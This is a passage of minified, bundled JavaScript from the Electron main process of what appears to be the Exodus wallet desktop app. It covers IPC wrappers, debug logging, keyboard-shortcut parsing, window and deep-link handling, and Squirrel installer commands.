          var r = [].slice.call(arguments, 1),
            o = n(t);
          return o[e].apply(o, r);
        };
      });
  },
  function (e, t, n) {
    "use strict";
    var r = n(113),
      o = n.n(r);
    t.default = (e) =>
      void 0 === globalThis.Buffer
        ? e
        : (o()(e).forEach(function (e) {
            e instanceof Uint8Array && this.update(globalThis.Buffer.from(e));
          }),
          e);
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "wrapIpc", function () {
      return c;
    });
    var r = n(114);
    const o = new WeakMap(),
      i = new WeakMap();
    function s(e, t, n) {
      const s = i.get(e);
      if (s && (s.filter !== t || s.useBuffers !== n))
        throw new Error(
          "Attempting to register the same handler with different parameters"
        );
      i.set(e, { filter: t, useBuffers: n });
      const c = o.get(e);
      if (c) return c;
      const a = (o, ...i) => {
        if (!0 !== t(o)) return;
        const s = n ? Object(r.default)(i) : i;
        return e(o, ...s);
      };
      return o.set(e, a), a;
    }
    function c(e, t) {
      return {
        on(n, r, o = !0) {
          e.on(n, s(r, t, o));
        },
        once(n, r, o = !0) {
          e.once(n, s(r, t, o));
        },
        removeListener(t, n) {
          e.removeListener(t, o.get(n));
        },
        removeAllListeners(t) {
          e.removeAllListeners(t);
        },
        handle(n, r, o = !0) {
          e.handle(n, s(r, t, o));
        },
        removeHandler(t) {
          e.removeHandler(t);
        },
        send(...t) {
          e.send(...t);
        },
        sendSync: (...t) => e.sendSync(...t),
        invoke: (...t) => e.invoke(...t),
      };
    }
  },
  function (e, t) {
    function n(e) {
      return e instanceof Error
        ? { ...e, name: e.name, message: e.message, stack: r(e.stack) }
        : { name: e.name || "UNKNOWN", message: JSON.stringify(e) };
    }
    function r(e) {
      return e
        .replace(/\/Users\/[^/]+/g, "")
        .replace(/\\Users\\[^\\]+/g, "")
        .replace(/\/home\/[^/]+/g, "");
    }
    e.exports = {
      toObject: n,
      JSONReplacer: function (e, t) {
        return t instanceof Error ? n(t) : t;
      },
      cleanStack: r,
    };
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "createServerImplementation", function () {
      return i;
    });
    var r = n(116),
      o = n(78);
    function i(e, t, n, i, s, c, { wrap: a, unwrap: u } = {}) {
      const l = `${o.CHANNEL_PREFIX}:${i}:call`,
        f = async (e, l) => {
          const f = n(e, l);
          if (!s.includes(f))
            return void console.error(
              `Skipping unexpected message from (${f}) to channel: ${i}`
            );
          const { func: d, args: p, token: h } = l.payload,
            [m, y] = await (async function (e, t) {
              if ("function" == typeof c[e])
                try {
                  u && (t = u(e, t));
                  let n = await c[e](...t);
                  return a && (n = a(e, n)), [null, n];
                } catch (e) {
                  return [e, null];
                }
              try {
                return [null, c[e]];
              } catch (e) {
                return [e];
              }
            })(d, p),
            w = m ? Object(r.toObject)(m) : null;
          t(f, `${o.CHANNEL_PREFIX}:${i}:response:${h}`, [w, y]);
        };
      return e.on(l, f), { stop: () => e.removeListener(l, f) };
    }
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "prepareMetaEntry", function () {
      return o;
    });
    var r = n(79);
    function o(e, { url: t, domains: n, ...o }) {
      if (Object.keys(o).length > 0) throw new Error("Unexpected argument");
      if (!r.meta.has(e)) throw new Error(`Unknown webContents type: '${e}'`);
      const i = { ...r.meta.get(e) };
      if (i.parallel && !i.multiple)
        throw new Error("`parallel: true` requires `multiple: true`");
      if (i.parallel && i.persistent)
        throw new Error("Can not use persistent session in parallel");
      if (i.parallel && i.ipc)
        throw new Error(
          "To support targeted IPC handling, webContents could not be .parallel"
        );
      if (i.hasOwnProperty("reusable"))
        throw new Error("Entry shouldn't have a .reusable property");
      if (((i.reusable = i.persistent && i.multiple), i.offline)) {
        if (i.domains || n)
          throw new Error(`Domains can not be specified for offline ${e}`);
        if (i.protocols.length > 1 || "file:" !== i.protocols[0])
          throw new Error(
            `Offline session can use only file: protocol for ${e}`
          );
        i.domains = [];
      } else {
        if (!!i.domains == !!n)
          throw new Error(`Domains argument (un)expected for '${e}'`);
        i.domains || (i.domains = n);
      }
      if (!!i.url == !!t)
        throw new Error(`Url argument (un)expected for '${e}'`);
      if ((i.url || (i.url = t), i.hasOwnProperty("type")))
        throw new Error("Entry shouldn't have a .type property");
      return (
        (i.type = e), (i.flags = new Set(i.flags || [])), Object.freeze(i), i
      );
    }
  },
  function (e) {
    e.exports = [
      "about",
      "close",
      "copy",
      "cut",
      "delete",
      "front",
      "help",
      "hide",
      "hideothers",
      "minimize",
      "paste",
      "pasteandmatchstyle",
      "quit",
      "redo",
      "resetzoom",
      "selectall",
      "services",
      "startspeaking",
      "stopspeaking",
      "togglefullscreen",
      "undo",
      "unhide",
      "window",
      "zoom",
      "zoomin",
      "zoomout",
    ];
  },
  function (e, t) {
    e.exports = require("tty");
  },
  function (e, t, n) {
    const r = n(120),
      o = n(35);
    (t.init = function (e) {
      e.inspectOpts = {};
      const n = Object.keys(t.inspectOpts);
      for (let r = 0; r < n.length; r++)
        e.inspectOpts[n[r]] = t.inspectOpts[n[r]];
    }),
      (t.log = function (...e) {
        return process.stderr.write(o.format(...e) + "\n");
      }),
      (t.formatArgs = function (n) {
        const { namespace: r, useColors: o } = this;
        if (o) {
          const t = this.color,
            o = "[3" + (t < 8 ? t : "8;5;" + t),
            i = `  ${o};1m${r} [0m`;
          (n[0] = i + n[0].split("\n").join("\n" + i)),
            n.push(o + "m+" + e.exports.humanize(this.diff) + "[0m");
        } else
          n[0] =
            (function () {
              if (t.inspectOpts.hideDate) return "";
              return new Date().toISOString() + " ";
            })() +
            r +
            " " +
            n[0];
      }),
      (t.save = function (e) {
        e ? (process.env.DEBUG = e) : delete process.env.DEBUG;
      }),
      (t.load = function () {
        return process.env.DEBUG;
      }),
      (t.useColors = function () {
        return "colors" in t.inspectOpts
          ? Boolean(t.inspectOpts.colors)
          : r.isatty(process.stderr.fd);
      }),
      (t.destroy = o.deprecate(() => {},
      "Instance method `debug.destroy()` is deprecated and no longer does anything. It will be removed in the next major version of `debug`.")),
      (t.colors = [6, 2, 3, 4, 5, 1]);
    try {
      const e = n(
        !(function () {
          var e = new Error("Cannot find module 'supports-color'");
          throw ((e.code = "MODULE_NOT_FOUND"), e);
        })()
      );
      e &&
        (e.stderr || e).level >= 2 &&
        (t.colors = [
          20, 21, 26, 27, 32, 33, 38, 39, 40, 41, 42, 43, 44, 45, 56, 57, 62,
          63, 68, 69, 74, 75, 76, 77, 78, 79, 80, 81, 92, 93, 98, 99, 112, 113,
          128, 129, 134, 135, 148, 149, 160, 161, 162, 163, 164, 165, 166, 167,
          168, 169, 170, 171, 172, 173, 178, 179, 184, 185, 196, 197, 198, 199,
          200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 214, 215, 220, 221,
        ]);
    } catch (e) {}
    (t.inspectOpts = Object.keys(process.env)
      .filter((e) => /^debug_/i.test(e))
      .reduce((e, t) => {
        const n = t
          .substring(6)
          .toLowerCase()
          .replace(/_([a-z])/g, (e, t) => t.toUpperCase());
        let r = process.env[t];
        return (
          (r =
            !!/^(yes|on|true|enabled)$/i.test(r) ||
            (!/^(no|off|false|disabled)$/i.test(r) &&
              ("null" === r ? null : Number(r)))),
          (e[n] = r),
          e
        );
      }, {})),
      (e.exports = n(80)(t));
    const { formatters: i } = e.exports;
    (i.o = function (e) {
      return (
        (this.inspectOpts.colors = this.useColors),
        o
          .inspect(e, this.inspectOpts)
          .split("\n")
          .map((e) => e.trim())
          .join(" ")
      );
    }),
      (i.O = function (e) {
        return (
          (this.inspectOpts.colors = this.useColors),
          o.inspect(e, this.inspectOpts)
        );
      });
  },
  function (e, t) {
    var n = 1e3,
      r = 60 * n,
      o = 60 * r,
      i = 24 * o,
      s = 7 * i,
      c = 365.25 * i;
    function a(e, t, n, r) {
      var o = t >= 1.5 * n;
      return Math.round(e / n) + " " + r + (o ? "s" : "");
    }
    e.exports = function (e, t) {
      t = t || {};
      var u = typeof e;
      if ("string" === u && e.length > 0)
        return (function (e) {
          if ((e = String(e)).length > 100) return;
          var t =
            /^(-?(?:\d+)?\.?\d+) *(milliseconds?|msecs?|ms|seconds?|secs?|s|minutes?|mins?|m|hours?|hrs?|h|days?|d|weeks?|w|years?|yrs?|y)?$/i.exec(
              e
            );
          if (!t) return;
          var a = parseFloat(t[1]);
          switch ((t[2] || "ms").toLowerCase()) {
            case "years":
            case "year":
            case "yrs":
            case "yr":
            case "y":
              return a * c;
            case "weeks":
            case "week":
            case "w":
              return a * s;
            case "days":
            case "day":
            case "d":
              return a * i;
            case "hours":
            case "hour":
            case "hrs":
            case "hr":
            case "h":
              return a * o;
            case "minutes":
            case "minute":
            case "mins":
            case "min":
            case "m":
              return a * r;
            case "seconds":
            case "second":
            case "secs":
            case "sec":
            case "s":
              return a * n;
            case "milliseconds":
            case "millisecond":
            case "msecs":
            case "msec":
            case "ms":
              return a;
            default:
              return;
          }
        })(e);
      if ("number" === u && isFinite(e))
        return t.long
          ? (function (e) {
              var t = Math.abs(e);
              if (t >= i) return a(e, t, i, "day");
              if (t >= o) return a(e, t, o, "hour");
              if (t >= r) return a(e, t, r, "minute");
              if (t >= n) return a(e, t, n, "second");
              return e + " ms";
            })(e)
          : (function (e) {
              var t = Math.abs(e);
              if (t >= i) return Math.round(e / i) + "d";
              if (t >= o) return Math.round(e / o) + "h";
              if (t >= r) return Math.round(e / r) + "m";
              if (t >= n) return Math.round(e / n) + "s";
              return e + "ms";
            })(e);
      throw new Error(
        "val is not a non-empty string or a valid number. val=" +
          JSON.stringify(e)
      );
    };
  },
  function (e, t, n) {
    (t.formatArgs = function (t) {
      if (
        ((t[0] =
          (this.useColors ? "%c" : "") +
          this.namespace +
          (this.useColors ? " %c" : " ") +
          t[0] +
          (this.useColors ? "%c " : " ") +
          "+" +
          e.exports.humanize(this.diff)),
        !this.useColors)
      )
        return;
      const n = "color: " + this.color;
      t.splice(1, 0, n, "color: inherit");
      let r = 0,
        o = 0;
      t[0].replace(/%[a-zA-Z%]/g, (e) => {
        "%%" !== e && (r++, "%c" === e && (o = r));
      }),
        t.splice(o, 0, n);
    }),
      (t.save = function (e) {
        try {
          e ? t.storage.setItem("debug", e) : t.storage.removeItem("debug");
        } catch (e) {}
      }),
      (t.load = function () {
        let e;
        try {
          e = t.storage.getItem("debug");
        } catch (e) {}
        !e && "env" in process && (e = process.env.DEBUG);
        return e;
      }),
      (t.useColors = function () {
        0;
        if (
          "undefined" != typeof navigator &&
          navigator.userAgent &&
          navigator.userAgent.toLowerCase().match(/(edge|trident)\/(\d+)/)
        )
          return !1;
        return (
          ("undefined" != typeof document &&
            document.documentElement &&
            document.documentElement.style &&
            document.documentElement.style.WebkitAppearance) ||
          ("undefined" != typeof navigator &&
            navigator.userAgent &&
            navigator.userAgent.toLowerCase().match(/firefox\/(\d+)/) &&
            parseInt(RegExp.$1, 10) >= 31) ||
          ("undefined" != typeof navigator &&
            navigator.userAgent &&
            navigator.userAgent.toLowerCase().match(/applewebkit\/(\d+)/))
        );
      }),
      (t.storage = (function () {
        try {
          return localStorage;
        } catch (e) {}
      })()),
      (t.destroy = (() => {
        let e = !1;
        return () => {
          e ||
            ((e = !0),
            console.warn(
              "Instance method `debug.destroy()` is deprecated and no longer does anything. It will be removed in the next major version of `debug`."
            ));
        };
      })()),
      (t.colors = [
        "#0000CC",
        "#0000FF",
        "#0033CC",
        "#0033FF",
        "#0066CC",
        "#0066FF",
        "#0099CC",
        "#0099FF",
        "#00CC00",
        "#00CC33",
        "#00CC66",
        "#00CC99",
        "#00CCCC",
        "#00CCFF",
        "#3300CC",
        "#3300FF",
        "#3333CC",
        "#3333FF",
        "#3366CC",
        "#3366FF",
        "#3399CC",
        "#3399FF",
        "#33CC00",
        "#33CC33",
        "#33CC66",
        "#33CC99",
        "#33CCCC",
        "#33CCFF",
        "#6600CC",
        "#6600FF",
        "#6633CC",
        "#6633FF",
        "#66CC00",
        "#66CC33",
        "#9900CC",
        "#9900FF",
        "#9933CC",
        "#9933FF",
        "#99CC00",
        "#99CC33",
        "#CC0000",
        "#CC0033",
        "#CC0066",
        "#CC0099",
        "#CC00CC",
        "#CC00FF",
        "#CC3300",
        "#CC3333",
        "#CC3366",
        "#CC3399",
        "#CC33CC",
        "#CC33FF",
        "#CC6600",
        "#CC6633",
        "#CC9900",
        "#CC9933",
        "#CCCC00",
        "#CCCC33",
        "#FF0000",
        "#FF0033",
        "#FF0066",
        "#FF0099",
        "#FF00CC",
        "#FF00FF",
        "#FF3300",
        "#FF3333",
        "#FF3366",
        "#FF3399",
        "#FF33CC",
        "#FF33FF",
        "#FF6600",
        "#FF6633",
        "#FF9900",
        "#FF9933",
        "#FFCC00",
        "#FFCC33",
      ]),
      (t.log = console.debug || console.log || (() => {})),
      (e.exports = n(80)(t));
    const { formatters: r } = e.exports;
    r.j = function (e) {
      try {
        return JSON.stringify(e);
      } catch (e) {
        return "[UnexpectedJSONParseError]: " + e.message;
      }
    };
  },
  function (e, t, n) {
    !0 === process.browser || process.__nwjs
      ? (e.exports = n(123))
      : (e.exports = n(121));
  },
  function (e, t) {
    const n =
        /^(CommandOrControl|CmdOrCtrl|Command|Cmd|Control|Ctrl|AltGr|Option|Alt|Shift|Super)/i,
      r =
        /^(Plus|Space|Tab|Backspace|Delete|Insert|Return|Enter|Up|Down|Left|Right|Home|End|PageUp|PageDown|Escape|Esc|VolumeUp|VolumeDown|VolumeMute|MediaNextTrack|MediaPreviousTrack|MediaStop|MediaPlayPause|PrintScreen|F24|F23|F22|F21|F20|F19|F18|F17|F16|F15|F14|F13|F12|F11|F10|F9|F8|F7|F6|F5|F4|F3|F2|F1|[0-9A-Z)!@#$%^&*(:+<_>?~{|}";=,\-./`[\\\]'])/i,
      o = {};
    function i({ accelerator: e, event: t }, n) {
      switch (n) {
        case "command":
        case "cmd":
          return (function (e, t, n) {
            if ("darwin" !== process.platform) return o;
            if (t.metaKey)
              throw new Error("Double `Command` modifier specified.");
            return {
              event: Object.assign({}, t, { metaKey: !0 }),
              accelerator: e.slice(n.length),
            };
          })(e, t, n);
        case "super":
          return (function (e, t, n) {
            if (t.metaKey)
              throw new Error("Double `Super` modifier specified.");
            return {
              event: Object.assign({}, t, { metaKey: !0 }),
              accelerator: e.slice(n.length),
            };
          })(e, t, n);
        case "control":
        case "ctrl":
          return (function (e, t, n) {
            if (t.ctrlKey)
              throw new Error("Double `Control` modifier specified.");
            return {
              event: Object.assign({}, t, { ctrlKey: !0 }),
              accelerator: e.slice(n.length),
            };
          })(e, t, n);
        case "commandorcontrol":
        case "cmdorctrl":
          return (function (e, t, n) {
            if ("darwin" === process.platform) {
              if (t.metaKey)
                throw new Error("Double `Command` modifier specified.");
              return {
                event: Object.assign({}, t, { metaKey: !0 }),
                accelerator: e.slice(n.length),
              };
            }
            if (t.ctrlKey)
              throw new Error("Double `Control` modifier specified.");
            return {
              event: Object.assign({}, t, { ctrlKey: !0 }),
              accelerator: e.slice(n.length),
            };
          })(e, t, n);
        case "option":
        case "altgr":
        case "alt":
          return (function (e, t, n) {
            if ("option" === n && "darwin" !== process.platform) return o;
            if (t.altKey) throw new Error("Double `Alt` modifier specified.");
            return {
              event: Object.assign({}, t, { altKey: !0 }),
              accelerator: e.slice(n.length),
            };
          })(e, t, n);
        case "shift":
          return (function (e, t, n) {
            if (t.shiftKey)
              throw new Error("Double `Shift` modifier specified.");
            return {
              event: Object.assign({}, t, { shiftKey: !0 }),
              accelerator: e.slice(n.length),
            };
          })(e, t, n);
        default:
          console.error(n);
      }
    }
    function s({ accelerator: e, event: t }) {
      return { event: t, accelerator: e.trim().slice(1) };
    }
    const c = {
      0: "Digit0",
      1: "Digit1",
      2: "Digit2",
      3: "Digit3",
      4: "Digit4",
      5: "Digit5",
      6: "Digit6",
      7: "Digit7",
      8: "Digit8",
      9: "Digit9",
      "-": "Minus",
      "=": "Equal",
      Q: "KeyQ",
      W: "KeyW",
      E: "KeyE",
      R: "KeyR",
      T: "KeyT",
      Y: "KeyY",
      U: "KeyU",
      I: "KeyI",
      O: "KeyO",
      P: "KeyP",
      "[": "BracketLeft",
      "]": "BracketRight",
      A: "KeyA",
      S: "KeyS",
      D: "KeyD",
      F: "KeyF",
      G: "KeyG",
      H: "KeyH",
      J: "KeyJ",
      K: "KeyK",
      L: "KeyL",
      ";": "Semicolon",
      "'": "Quote",
      "`": "Backquote",
      "/": "Backslash",
      Z: "KeyZ",
      X: "KeyX",
      C: "KeyC",
      V: "KeyV",
      B: "KeyB",
      N: "KeyN",
      M: "KeyM",
      ",": "Comma",
      ".": "Period",
      "\\": "Slash",
      " ": "Space",
    };
    function a({ accelerator: e, event: t }, n) {
      if (n.length > 1 || t.key) throw new Error(`Unvalid keycode \`${n}\`.`);
      const r = n.toUpperCase() in c ? c[n.toUpperCase()] : null;
      return {
        event: Object.assign({}, t, { key: n }, r ? { code: r } : null),
        accelerator: e.trim().slice(n.length),
      };
    }
    const u = Object.assign(Object.create(null), {
      plus: "Add",
      space: "Space",
      tab: "Tab",
      backspace: "Backspace",
      delete: "Delete",
      insert: "Insert",
      return: "Return",
      enter: "Return",
      up: "ArrowUp",
      down: "ArrowDown",
      left: "ArrowLeft",
      right: "ArrowRight",
      home: "Home",
      end: "End",
      pageup: "PageUp",
      pagedown: "PageDown",
      escape: "Escape",
      esc: "Escape",
      volumeup: "AudioVolumeUp",
      volumedown: "AudioVolumeDown",
      volumemute: "AudioVolumeMute",
      medianexttrack: "MediaTrackNext",
      mediaprevioustrack: "MediaTrackPrevious",
      mediastop: "MediaStop",
      mediaplaypause: "MediaPlayPause",
      printscreen: "PrintScreen",
    });
    for (let e = 1; e <= 24; e++) u[`f${e}`] = `F${e}`;
    function l({ accelerator: e, event: t }, { code: n, key: r }) {
      if (t.code) throw new Error(`Duplicated keycode \`${r}\`.`);
      return {
        event: Object.assign({}, t, { key: r }, n ? { code: n } : null),
        accelerator: e.trim().slice((r && r.length) || 0),
      };
    }
    e.exports = {
      UNSUPPORTED: o,
      reduceModifier: i,
      reducePlus: s,
      reduceKey: a,
      reduceCode: l,
      toKeyEvent: function (e) {
        let t = { accelerator: e, event: {} };
        for (; "" !== t.accelerator; ) {
          const e = t.accelerator.match(n);
          if (e) {
            if ((t = i(t, e[0].toLowerCase())) === o)
              return { unsupportedKeyForPlatform: !0 };
          } else if ("+" === t.accelerator.trim()[0]) t = s(t);
          else {
            const e = t.accelerator.match(r);
            if (!e) throw new Error(`Unvalid accelerator: "${t.accelerator}"`);
            {
              const n = e[0].toLowerCase();
              t = n in u ? l(t, { code: u[n], key: n }) : a(t, n);
            }
          }
        }
        return t.event;
      },
    };
  },
  function (e, t, n) {
    "use strict";
    function r(e) {
      return "string" != typeof e ? e : e.toLowerCase();
    }
    e.exports = function (e, t) {
      if (e === t) return !0;
      for (const n of ["altKey", "ctrlKey", "shiftKey", "metaKey"]) {
        const [r, o] = [e[n], t[n]];
        if (Boolean(r) !== Boolean(o)) return !1;
      }
      return (
        (r(e.key) === r(t.key) && void 0 !== e.key) ||
        (e.code === t.code && void 0 !== e.code)
      );
    };
  },
  function (e, t, n) {
    "use strict";
    const r =
        /^(Command|Cmd|Control|Ctrl|CommandOrControl|CmdOrCtrl|Alt|Option|AltGr|Shift|Super)$/,
      o =
        /^([0-9A-Z)!@#$%^&*(:+<_>?~{|}";=,\-./`[\\\]']|F1*[1-9]|F10|F2[0-4]|Plus|Space|Tab|Backspace|Delete|Insert|Return|Enter|Up|Down|Left|Right|Home|End|PageUp|PageDown|Escape|Esc|VolumeUp|VolumeDown|VolumeMute|MediaNextTrack|MediaPreviousTrack|MediaStop|MediaPlayPause|PrintScreen)$/;
    e.exports = function (e) {
      let t = e.split("+"),
        n = !1;
      return t.every((e, i) => {
        const s = o.test(e),
          c = r.test(e);
        if (s) {
          if (n) return !1;
          n = !0;
        }
        return !(i === t.length - 1 && !n) && (s || c);
      });
    };
  },
  function (e, t, n) {
    "use strict";
    var r = n(31),
      o = n.n(r),
      i = n(0),
      s = n(36),
      c = n.n(s),
      a = n(4),
      u = n(19),
      l = n(8),
      f = n(104),
      d = n(3),
      p = n(76),
      h = n.n(p),
      m = n(103),
      y = n(102);
    a.rpcMain.on("keyviewer-process:init", (e, t) => {
      d.appWindows.keyviewer ||
        ((d.appWindows.keyviewer = Object(m.init)(
          d.appWindows.background,
          d.appWindows.ui,
          t
        )),
        d.appWindows.keyviewer.webContents.once("dom-ready", () => {
          e.sender.send("keyviewer-process:opened");
        }),
        d.appWindows.keyviewer.once("closed", () => {
          delete d.appWindows.keyviewer;
        }));
    }),
      a.rpcMain.on("keyviewer-process:close", (e, t) => {
        d.appWindows.keyviewer.hide(), d.appWindows.keyviewer.destroy();
      }),
      a.rpcMain.on("wallet:qrCodeScan", (e, t) => {
        Object(y.init)(d.appWindows.background, d.appWindows.ui, t);
      }),
      a.rpcMain.on("ui:set-navbar-height", (e, t) => {
        for (const e of u.navbarHeightChangeHandlers) e(t.navbarHeight);
      }),
      a.rpcMain.handle("has-media-access", async (e, t) => {
        if ("camera" === t) {
          if (
            !(
              "darwin" === process.platform &&
              Number(c.a.release().split(".")[0]) >= 18
            )
          )
            return !0;
        }
        return (
          "granted" === i.systemPreferences.getMediaAccessStatus(t) ||
          i.systemPreferences.askForMediaAccess(t)
        );
      }),
      a.rpcMain.handle("openExternal", async (e, t) => {
        if (!Object(f.validate)(t))
          throw new Error("Navigation request declined");
        await i.shell.openExternal(t, { activate: !0 });
      }),
      a.rpcMain.handle("openExternal:unchecked", async (e, t) => {
        const { permissions: n = [] } = Object(l.getWebContentsMeta)(e.sender);
        if (!n.includes("openExternal"))
          throw new Error("Do not have openExternal permission");
        await i.shell.openExternal(t, { activate: !0 });
      }),
      a.rpcMain.handle("get-machine-id", async () => {
        const e = c.a.networkInterfaces();
        for (const [t, n] of Object.entries(e)) {
          if (t.startsWith("lo") || t.startsWith("Loopback")) continue;
          const e = n.find((e) => e.address && e.mac && "IPv4" === e.family);
          if (e) {
            const t = o.a.createHash("sha256");
            return t.update(e.mac), t.digest("hex");
          }
        }
      }),
      a.rpcMain.handle("dialog:open", (e, t) => {
        const n = i.BrowserWindow.getFocusedWindow();
        return i.dialog.showOpenDialog(n, t);
      });
    for (const [e, t] of h.a.on) a.rpcMain.on(e, t);
    for (const [e, t] of h.a.handle) a.rpcMain.handle(e, t);
  },
  function (e, t, n) {
    "use strict";
    n.r(t);
    n(128);
    var r = n(0),
      o = n(101),
      i = n.n(o),
      s = n(100),
      c = n.n(s),
      a = n(1),
      u = n.n(a),
      l = n(13),
      f = n(2),
      d = n(4),
      p = n(22),
      h = n.n(p),
      m = n(99),
      y = n(63),
      w = n(3),
      b = n(28),
      g = n(62),
      E = n(40);
    f.ENV_BUILD_EDEN && r.app.setName("Eden"),
      r.app.commandLine.appendSwitch("disable-renderer-backgrounding"),
      r.app.commandLine.appendSwitch(
        "autoplay-policy",
        "no-user-gesture-required"
      ),
      process.env.EXODUS_DISABLE_GPU && r.app.disableHardwareAcceleration();
    for (const e of m.default)
      Array.isArray(e)
        ? r.app.commandLine.appendSwitch(`disable-${e[0]}`, e[1])
        : r.app.commandLine.appendSwitch(`disable-${e}`);
    process.env.ELECTRON_FORCE_WINDOW_MENU_BAR = !0;
    const v = n(50)(process.argv);
    !(function () {
      if (f.ENV_TEST) console.log("TEST MODE");
      else {
        const e = ["_", "datadir", "debug", "disable-gpu", "p"];
        (!Object.keys(v).every((t) => e.includes(t)) || v._.length > 2) &&
          (console.error(
            "Can only pass whitelisted args; exiting",
            JSON.stringify(v)
          ),
          r.app.exit());
      }
    })(),
      v.datadir
        ? r.app.setPath("userData", u.a.resolve(v.datadir))
        : f.ENV_BUILD_EDEN &&
          r.app.setPath(
            "userData",
            u.a.join(r.app.getPath("appData"), "Exodus Eden")
          ),
      v._.length > 1 && (globalThis.OPENED_URL = v._[1]);
    const S = new RegExp(`^${f.PROTOCOL}://securitize`),
      O = (e) => S.test(e),
      k = (e) => {
        const { pathname: t, searchParams: n } = new l.URL(e);
        return { path: t.slice(1), params: Object.fromEntries(n.entries()) };
      };
    function _(e) {
      if (!e || !O(e)) return;
      const { path: t, params: n } = k(e);
      w.appWindows.ui.webContents.send("securitize:data", {
        path: t,
        params: n,
      });
    }
    function x(e, t) {
      e.preventDefault(),
        console.log("OPEN URL: " + t),
        (globalThis.OPENED_URL = t),
        _(t),
        Object(g.maybeDeepLink)(t);
    }
    r.app.on("open-file", x),
      r.app.on("open-url", x),
      d.rpcMain.on("securitize:fetch-data", () => {
        _(globalThis.OPENED_URL);
      }),
      d.rpcMain.on("securitize:fake-deep-link", (e, t) => {
        _(`${f.PROTOCOL}://securitize?${new URLSearchParams(t)}`);
      }),
      d.rpcMain.on("window:focus", () => {
        console.log("received window:focus request"),
          w.appWindows.background.show();
      }),
      d.rpcMain.on("window:fetchIsFocused", () => {
        console.log("received window:fetchIsFocused request");
        const e = w.appWindows.background.isFocused();
        w.appWindows.ui.webContents.send("window:isFocused", { isFocused: e });
      });
    const C = b.isExistsSync();
    (v.debug || process.env.DEBUG_MODE || f.ENV_DEV || C) &&
      (console.log("DEBUG MODE"),
      (globalThis.DEBUG_MODE = v.debug || process.env.DEBUG_MODE || !0));
    let D = !1;
    r.app.on("window-all-closed", function () {
      D && r.app.quit();
    }),
      process.on("uncaughtException", function (e) {
        console.error("Uncaught Exception", (e && e.message) || e),
          e && e.stack && console.error("Stacktrace", e.stack);
      }),
      process.on("unhandledRejection", function (e, t) {
        console.error(`Unhandled rejection: ${(e && e.stack) || e}`);
      });
    const N = c()(() => {
      r.app.quit();
    });
    ["SIGINT", "SIGTERM", "SIGQUIT", "beforeExit"].forEach((e) =>
      process.once(e, N)
    ),
      r.Menu.setApplicationMenu(null),
      d.rpcMain.once("app:showDevMenu", () => {
        r.Menu.setApplicationMenu(y.default);
      }),
      d.rpcMain.on("app:showPopupMenu", (e, t) => {
        r.Menu.buildFromTemplate(t).popup(r.BrowserWindow.getFocusedWindow());
      }),
      r.app.on("ready", async () => {
        h.a.instantEvent("appReady");
        const e = r.app.requestSingleInstanceLock();
        if (
          (r.app.on("second-instance", function (e, t, n) {
            const r = w.appWindows.background;
            r.isMinimized() && r.restore(),
              r.focus(),
              _(t.find((e) => O(e))),
              Object(g.maybeDeepLink)(t.find((e) => Object(g.isDeepLink)(e)));
          }),
          !e)
        )
          return (
            console.error(
              "Another instance of Exodus is already running. Please close it and try again."
            ),
            void (globalThis.OPENED_URL &&
            -1 !== globalThis.OPENED_URL.indexOf("recover")
              ? setTimeout(() => {
                  r.dialog.showMessageBoxSync({
                    title: "Wallet restore",
                    message: "Please close opened Exodus and try again.",
                    buttons: ["OK"],
                  }),
                    r.app.quit();
                }, 2e3)
              : setTimeout(r.app.quit.bind(r.app), 1e3))
          );
        const t = r.app.getPath("userData");
        console.log(`Exodus (production): DATA DIR: ${t}`),
          Object(d.mainBroadcastListener)();
        try {
          Object(w.onAppReady)(v);
        } catch (e) {
          console.error(e);
        }
        (D = !0),
          setImmediate(() => {
            try {
              if ("linux" === process.platform) {
                const e =
                    w.appWindows.background.webContents.getOwnerBrowserWindow(),
                  [t, n] = e.getSize();
                e.setSize(t + 1, n + 1), e.setSize(t - 1, n - 1);
              }
            } catch (e) {
              console.log(
                "Automatic resize failed — Do a manual window resize to fix black screen.",
                e.message
              );
            }
            if ("darwin" === process.platform)
              r.Menu.setApplicationMenu(y.default);
            else {
              const e = () => {
                r.Menu.setApplicationMenu(y.default);
                const { height: e, width: t } = Object(E.default)(
                  w.appWindows.background
                );
                w.appWindows.ui.setBounds({ x: 0, y: 0, width: t, height: e });
              };
              for (const t of [w.appWindows.background, w.appWindows.ui])
                i.a.register(t, "CmdOrCtrl+Shift+D", e);
            }
          });
      });
  },
  function (e, t, n) {
    "use strict";
    n.r(t),
      n.d(t, "handleCommand", function () {
        return l;
      });
    var r = n(61),
      o = n(0),
      i = n(1),
      s = n.n(i),
      c = n(2),
      a = n(51);
    function u(e, t) {
      const n = s.a.resolve(s.a.dirname(process.execPath), "..", "Update.exe");
      Object(r.spawn)(n, e, { detached: !0 }).on("close", t);
    }
    function l(e) {
      const t = s.a.basename(process.execPath);
      if ("--squirrel-install" === e || "--squirrel-updated" === e)
        return (
          u([`--createShortcut=${t}`], () => {
            Object(a.setDefaultProtocols)(),
              setTimeout(() => o.app.quit(), 3e3);
          }),
          !0
        );
      if ("--squirrel-uninstall" === e)
        return (
          Object(a.removeDefaultProtocols)(),
          u([`--removeShortcut=${t}`], o.app.quit.bind(o.app)),
          !0
        );
      if ("--squirrel-obsolete" === e) return o.app.quit(), !0;
      if ("--squirrel-firstrun" === e) {
        const e = (() =>
            c.ENV_BUILD_EXODUS
              ? "Exodus"
              : c.ENV_BUILD_EDEN
              ? "ExodusEden"
              : c.ENV_BUILD_NAME)(),
          t = {
            type: "info",
            buttons: ["OK"],
            title: `${e} Installed`,
            message: `${e} has been installed! You can run it by clicking the shortcut on your desktop or in the app menu.`,
            noLink: !1,
          };
        return (
          o.app.on("ready", () => {
            o.dialog.showMessageBoxSync(null, t), o.app.quit();
          }),
          !0
        );
      }
      return !1;
    }
  },
  function (e, t, n) {
    "use strict";
    n.r(t);
    var r = n(51);
    (() => {
      if ("win32" === process.platform) {
        return !n(130).handleCommand(process.argv[1]);
      }
      return Object(r.setDefaultProtocols)(), !0;
    })() && n(129);
  },
  function (e, t) {
    var n = Buffer.alloc,
      r = "0".charCodeAt(0),
      o = Buffer.from("ustar\0", "binary"),
      i = Buffer.from("00", "binary"),
      s = Buffer.from("ustar ", "binary"),
      c = Buffer.from(" \0", "binary"),
      a = parseInt("7777", 8),
      u = function (e, t, n, r) {
        for (; n < r; n++) if (e[n] === t) return n;
        return r;
      },
      l = function (e) {
        for (var t = 256, n = 0; n < 148; n++) t += e[n];
